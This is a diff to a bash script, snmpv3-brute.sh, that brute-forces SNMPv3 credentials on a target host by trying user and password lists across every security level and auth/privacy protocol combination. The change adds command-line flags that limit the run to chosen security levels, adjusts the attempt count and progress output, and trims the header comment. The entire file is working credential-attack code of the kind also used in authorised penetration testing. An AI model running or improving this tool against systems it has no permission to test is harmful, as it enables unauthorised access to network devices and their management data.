@@ -1,21 +1,18 @@
 #!/usr/bin/env bash
 #
-# snmpv3-brute.sh - SNMPv3 credential + security-level/protocol spray
-# Always runs the full sweep: noAuthNoPriv, authNoPriv, authPriv
-# across every auth protocol (MD5, SHA, SHA-224/256/384/512) and
-# every privacy protocol (DES, AES, AES-192, AES-256). No shortcuts.
-#
 # Usage:
 #   ./snmpv3-brute.sh -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]
 #
 # Examples:
-#   ./snmpv3-brute.sh -t 10.1.43.53 -u waserby -P passwords.txt
+#   ./snmpv3-brute.sh -t 10.1.43.53 -u john -P passwords.txt
 #   ./snmpv3-brute.sh -t 10.1.43.53 -U users.txt -P passwords.txt -d
+#
 
 set -u
 
 usage() {
     echo "Usage: $0 -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]"
+    echo "          [--NoAuthNoPriv] [--AuthNoPriv] [--AuthPriv]"
     echo ""
     echo "  -t  Target IP/host (required)"
     echo "  -u  Single username"
@@ -23,6 +20,12 @@ usage() {
     echo "  -p  Single password"
     echo "  -P  Path to password list"
     echo "  -d  Debug: show each attempt + raw error"
+    echo ""
+    echo "  --NoAuthNoPriv  Only run noAuthNoPriv checks"
+    echo "  --AuthNoPriv    Only run authNoPriv checks"
+    echo "  --AuthPriv      Only run authPriv checks"
+    echo "  (any combination of the three above may be given together;"
+    echo "   if none are given, all three run -- same as before)"
     echo ""
     echo "Exactly one of -u/-U and exactly one of -p/-P are required."
     echo ""
@@ -40,6 +43,34 @@ single_pass=""
 pass_list=""
 debug=0
 TIMEOUT=30
+
+# --- pre-pass: strip long-form level flags before getopts sees argv ---
+# getopts only understands short options, so pull --NoAuthNoPriv/--AuthNoPriv/
+# --AuthPriv out of "$@" here and rebuild argv without them. Order-independent
+# relative to the short flags.
+run_noauthnopriv=0
+run_authnopriv=0
+run_authpriv=0
+levels_specified=0
+
+remaining_args=()
+for arg in "$@"; do
+    case "$arg" in
+        --NoAuthNoPriv) run_noauthnopriv=1; levels_specified=1 ;;
+        --AuthNoPriv)   run_authnopriv=1;   levels_specified=1 ;;
+        --AuthPriv)     run_authpriv=1;     levels_specified=1 ;;
+        *) remaining_args+=("$arg") ;;
+    esac
+done
+
+# no level flags given -> default to running all three, same as original behavior
+if [ "$levels_specified" -eq 0 ]; then
+    run_noauthnopriv=1
+    run_authnopriv=1
+    run_authpriv=1
+fi
+
+set -- "${remaining_args[@]}"
 
 while getopts "t:u:U:p:P:dh" opt; do
     case "$opt" in
@@ -101,11 +132,16 @@ else
     done < "$pass_list"
 fi
 
-# --- protocol sets: always full ---
+# --- protocol sets: always full, per enabled level ---
 auth_protos=("MD5" "SHA" "SHA-224" "SHA-256" "SHA-384" "SHA-512")
 priv_protos=("DES" "AES" "AES-192" "AES-256")
 
-per_pair=$(( ${#auth_protos[@]} + (${#auth_protos[@]} * ${#priv_protos[@]}) ))
+per_pair=0
+[ "$run_authnopriv" -eq 1 ] && per_pair=$((per_pair + ${#auth_protos[@]}))
+[ "$run_authpriv" -eq 1 ] && per_pair=$((per_pair + (${#auth_protos[@]} * ${#priv_protos[@]}) ))
+
+noauth_count=0
+[ "$run_noauthnopriv" -eq 1 ] && noauth_count=1
 
 # count only passwords that pass the length filter, so the estimate matches what actually runs
 valid_pass_count=0
@@ -113,9 +149,15 @@ for pass in "${passwords[@]}"; do
     [ ${#pass} -ge 8 ] && valid_pass_count=$((valid_pass_count + 1))
 done
 
-total_attempts=$(( ${#users[@]} * (1 + valid_pass_count * per_pair) ))
+total_attempts=$(( ${#users[@]} * (noauth_count + valid_pass_count * per_pair) ))
+
+levels_desc=""
+[ "$run_noauthnopriv" -eq 1 ] && levels_desc="$levels_desc noAuthNoPriv"
+[ "$run_authnopriv" -eq 1 ] && levels_desc="$levels_desc authNoPriv"
+[ "$run_authpriv" -eq 1 ] && levels_desc="$levels_desc authPriv"
 
 echo "[*] Target: $target"
+echo "[*] Levels:$levels_desc"
 echo "[*] Users: ${#users[@]}  Passwords: ${#passwords[@]} (${valid_pass_count} usable, min 8 chars)"
 echo "[*] Auth protocols: ${auth_protos[*]}"
 echo "[*] Priv protocols: ${priv_protos[*]}"
@@ -150,10 +192,12 @@ try_one() {
 
     attempt_num=$((attempt_num + 1))
     if [ $((attempt_num % 200)) -eq 0 ]; then
-        local now elapsed
+        local now elapsed mins secs
         now=$(date +%s)
         elapsed=$((now - start_time))
-        echo "    ... $attempt_num/$total_attempts attempts, ${elapsed}s elapsed"
+        mins=$((elapsed / 60))
+        secs=$((elapsed % 60))
+        echo "    ... $attempt_num/$total_attempts attempts, $(printf '%02d:%02d' "$mins" "$secs") elapsed"
     fi
 
     if [ "$rc" -eq 0 ]; then
@@ -172,18 +216,26 @@ try_one() {
 
 for user in "${users[@]}"; do
 
-    try_one "noAuthNoPriv" "" "" "$user" ""
+    if [ "$run_noauthnopriv" -eq 1 ]; then
+        try_one "noAuthNoPriv" "" "" "$user" ""
+    fi
 
     for pass in "${passwords[@]}"; do
         [ ${#pass} -lt 8 ] && continue
 
-        for authproto in "${auth_protos[@]}"; do
-            try_one "authNoPriv" "$authproto" "" "$user" "$pass"
-
-            for privproto in "${priv_protos[@]}"; do
-                try_one "authPriv" "$authproto" "$privproto" "$user" "$pass"
+        if [ "$run_authnopriv" -eq 1 ]; then
+            for authproto in "${auth_protos[@]}"; do
+                try_one "authNoPriv" "$authproto" "" "$user" "$pass"
             done
-        done
+        fi
+
+        if [ "$run_authpriv" -eq 1 ]; then
+            for authproto in "${auth_protos[@]}"; do
+                for privproto in "${priv_protos[@]}"; do
+                    try_one "authPriv" "$authproto" "$privproto" "$user" "$pass"
+                done
+            done
+        fi
     done
 done
 
